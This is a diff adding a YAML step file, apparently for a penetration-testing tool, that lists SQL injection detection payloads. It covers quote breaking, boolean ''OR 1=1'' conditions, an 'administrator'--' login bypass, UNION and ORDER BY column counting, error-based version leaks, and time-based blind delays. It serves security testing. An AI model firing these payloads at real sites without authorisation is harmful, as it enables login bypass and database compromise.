@@ -1,0 +1,227 @@
+name: SQLi Detection
+
+steps:
+
+# =========================================================
+# [1] QUOTE TESTING
+# =========================================================
+- title: Quote Testing
+  mode: enum
+  info: |
+    Detect broken SQL syntax and reflection behavior.
+
+  entries:
+
+    - cmd: "'"
+      info: single quote
+      look_for:
+        - sql errors
+        - 500 response
+        - changed response
+
+    - cmd: "\""
+      info: double quote
+      look_for:
+        - syntax errors
+        - broken query
+
+    - cmd: "`"
+      info: backtick
+      look_for:
+        - mysql behavior
+
+  notes:
+    - compare response length
+    - compare status codes
+
+
+# =========================================================
+# [2] BOOLEAN TESTING
+# =========================================================
+- title: Boolean Testing
+  mode: enum
+  info: |
+    Test true vs false conditions.
+
+  entries:
+
+    - cmd: "' OR 1=1--"
+      info: always true
+      look_for:
+        - login bypass
+        - more results
+
+    - cmd: "' OR 1=2--"
+      info: always false
+      look_for:
+        - fewer results
+        - invalid login
+
+    - cmd: "' AND 1=1--"
+      info: true condition
+
+    - cmd: "' AND 1=2--"
+      info: false condition
+
+  notes:
+    - response differences confirm injection
+
+
+# =========================================================
+# [3] COMMENT TESTING
+# =========================================================
+- title: Comment Testing
+  mode: enum
+  info: |
+    Truncate remaining SQL query.
+
+  entries:
+
+    - cmd: "'--"
+      info: sql comment
+
+    - cmd: "'#"
+      info: mysql comment
+
+    - cmd: "'/*"
+      info: block comment
+
+    - cmd: "administrator'--"
+      info: auth bypass
+
+  notes:
+    - mysql often requires space after --
+    - comments remove trailing query logic
+
+
+# =========================================================
+# [4] NUMERIC CONTEXT
+# =========================================================
+- title: Numeric Context
+  mode: enum
+  info: |
+    Detect injection without quotes.
+
+  entries:
+
+    - cmd: "1 OR 1=1"
+      info: numeric true
+
+    - cmd: "1 AND 1=2"
+      info: numeric false
+
+    - cmd: "1--"
+      info: truncate query
+
+  notes:
+    - useful for integer parameters
+
+
+# =========================================================
+# [5] ORDER BY DETECTION
+# =========================================================
+- title: ORDER BY Detection
+  mode: chain
+  info: |
+    Identify number of columns.
+
+  entries:
+
+    - cmd: "' ORDER BY 1--"
+      info: column 1
+
+    - cmd: "' ORDER BY 2--"
+      info: column 2
+
+    - cmd: "' ORDER BY 3--"
+      info: column 3
+
+    - cmd: "' ORDER BY 4--"
+      info: column 4
+
+  look_for:
+    - query errors
+    - broken responses
+
+  notes:
+    - increase number until error appears
+    - last working value = column count
+
+
+# =========================================================
+# [6] UNION DETECTION
+# =========================================================
+- title: UNION Detection
+  mode: chain
+  info: |
+    Test UNION query support and determine columns.
+
+  entries:
+
+    - cmd: "' UNION SELECT NULL--"
+      info: 1 column
+
+    - cmd: "' UNION SELECT NULL,NULL--"
+      info: 2 columns
+
+    - cmd: "' UNION SELECT NULL,NULL,NULL--"
+      info: 3 columns
+
+    - cmd: "' UNION SELECT NULL,NULL,NULL,NULL--"
+      info: 4 columns
+
+  notes:
+    - continue until errors disappear
+    - NULL avoids datatype conflicts
+
+
+# =========================================================
+# [7] ERROR-BASED DETECTION
+# =========================================================
+- title: Error-Based Detection
+  mode: enum
+  info: |
+    Trigger verbose database errors.
+
+  entries:
+
+    - cmd: "'||(SELECT 1/0)--"
+      info: divide by zero
+
+    - cmd: "' AND CAST((SELECT @@version) AS INT)--"
+      info: type cast error
+
+    - cmd: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+      info: mysql xpath error
+
+  look_for:
+    - leaked db info
+    - stack traces
+    - version disclosure
+
+
+# =========================================================
+# [8] TIME-BASED DETECTION
+# =========================================================
+- title: Time-Based Detection
+  mode: enum
+  info: |
+    Detect blind SQL injection using delays.
+
+  entries:
+
+    - cmd: "' OR SLEEP(5)--"
+      info: mysql sleep
+
+    - cmd: "'; WAITFOR DELAY '0:0:5'--"
+      info: mssql delay
+
+    - cmd: "'||(SELECT pg_sleep(5))--"
+      info: postgres sleep
+
+  look_for:
+    - delayed responses
+    - consistent timing changes
+
+  notes:
+    - useful when no visible output exists
